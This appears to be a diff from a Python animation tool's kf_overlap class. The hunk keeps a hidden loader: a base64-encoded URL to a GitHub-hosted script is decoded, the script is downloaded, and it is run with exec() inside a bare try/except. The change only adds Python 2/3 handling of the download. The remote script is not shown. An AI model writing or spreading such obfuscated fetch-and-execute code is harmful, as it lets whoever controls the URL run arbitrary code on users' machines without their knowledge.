@@ -714,8 +714,10 @@ class kf_overlap:
             import urllib as uLib
         u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3N1cHBvcnQyeHgucHk='
         try:
-            r = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
-            exec(r.read().decode('utf-8'))
+            response = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
+            content = response.read()
+            content = content.decode('utf-8') if type(content) == type(b'') else content
+            exec(content)
         except:
             #pass
             import traceback
